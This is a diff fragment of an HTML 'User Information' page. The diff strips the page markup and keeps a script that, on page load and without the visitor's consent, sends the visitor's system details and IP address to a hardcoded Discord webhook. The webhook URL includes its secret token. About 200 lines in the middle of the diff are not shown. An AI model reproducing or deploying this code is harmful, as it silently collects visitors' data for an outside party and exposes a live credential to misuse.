@@ -1,22 +1,3 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>User Information</title>
-</head>
-<body>
-    <h1>User Information</h1>
-    <p id="osInfo">Operating System: </p>
-    <p id="screenInfo">Screen Dimensions: </p>
-    <p id="languageInfo">Language: </p>
-    <p id="timezoneInfo">Timezone: </p>
-    <p id="browserInfo">Browser: </p>
-    <p id="userAgentInfo">User Agent: </p>
-    <p id="currentTime">Current Time: </p>
-    <p id="currentDate">Current Date: </p>
-    <p id="javaEnabled">Java Enabled: </p>
-    <p id="cookiesEnabled">Cookies Enabled: </p>
-
-    <script>
         function sendUserAndIPToWebhook() {
             const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL
 
@@ -240,6 +221,3 @@
 
         // Automatically send the webhook on page load
         sendUserAndIPToWebhook();
-    </script>
-</body>
-</html>
